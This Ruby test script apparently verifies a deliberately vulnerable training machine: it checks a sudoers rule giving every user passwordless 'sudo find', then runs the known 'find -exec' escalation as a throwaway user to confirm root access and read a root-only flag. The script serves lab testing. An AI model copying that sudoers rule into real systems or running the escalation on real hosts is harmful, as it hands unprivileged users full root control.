require_relative '../../../../../lib/post_provision_test'


class SudoRootFindTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_find'
    self.module_path = get_module_path(__FILE__)
    super
  end

  # Inputs: leaked_filenames and strings_to_leak are both checked below.
  def test_module
    super
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_find", 'root:root 440')
      test_local_command('sudoers rule allows find as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_find', 'ALL  ALL=(root) NOPASSWD: /bin/find *, /usr/bin/find *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list_find', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      test_local_command('sudoers syntax is valid', 'visudo -c 2>&1', 'parsed OK')
      test_command_succeeds('find is a real binary at /usr/bin/find', 'test -x /usr/bin/find')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees with sudo -l
      test_local_command('unprivileged user can list the find sudo rule', 'sudo -n -l', '/usr/bin/find *', user: 'nobody')
      # the flag is not readable without escalating
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        fname = leaked[i] || leaked.first
        next unless fname
        test_command_succeeds("unprivileged user cannot read leaked #{fname} directly",
                              "! cat #{Shellwords.escape("/root/#{fname}")} 2>/dev/null", user: 'nobody')
      end
    end

    tier(3) do
      # <privilege>root_rwx: the exploit must land a root (uid=0) context.
      # Pick a root-only flag to read back as proof. leak_files zips the inputs,
      # so strings_to_leak[i] lives in /root/leaked_filenames[i] (mode 0600).
      flag_name = nil
      flag_string = nil
      strings.each_with_index do |s, i|
        next if s.strip.empty?
        next unless leaked[i]
        flag_name = leaked[i]
        flag_string = s
        break
      end

      if flag_name.nil?
        skip_check('privilege escalation via sudo find (GTFOBins)',
                   'no leaked string/filename pair to read back as root-only proof', tier: 3)
      else
        # Create a real, disposable unprivileged login account, escalate as them,
        # then remove it so the shipped image carries no extra login.
        with_throwaway_ssh_user do |user, _pass|
          flag_path = "/root/#{flag_name}"
          # GTFOBins: find, sudo. sudo runs find as root and find's -exec runs an
          # arbitrary command as root. Two proofs in one shell: `id` shows uid=0,
          # and reading the 0600 root:root flag shows a genuine root context (an
          # unprivileged user cannot read it directly — see tier 2).
          cmd = "sudo -n find /etc/hostname -maxdepth 0 -exec id \\; ; " \
                "sudo -n find /etc/hostname -maxdepth 0 -exec cat #{Shellwords.escape(flag_path)} \\;"
          res = run_as_user(user, cmd)
          body = "#{res[:stdout]}\n#{res[:stderr]}"
          add_evidence('t3_escalation', "echo #{Shellwords.escape(body[-4000..-1] || body)}")

          got_root = body.include?('uid=0(root)')
          got_flag = body.include?(flag_string)
          if got_root && got_flag
            pass_check('privilege escalation via sudo find (GTFOBins) reads root-only flag',
                       "unprivileged user #{user} ran `sudo find -exec` as root (uid=0) and read #{flag_path} — <privilege>=root_rwx verified",
                       tier: 3)
          else
            fail_check('privilege escalation via sudo find (GTFOBins) reads root-only flag',
                       "expected uid=0(root) and the leaked flag string in output (root=#{got_root}, flag=#{got_flag}). See t3_escalation evidence.",
                       tier: 3)
          end
        end
      end
    end
  end

end

SudoRootFindTest.new.run
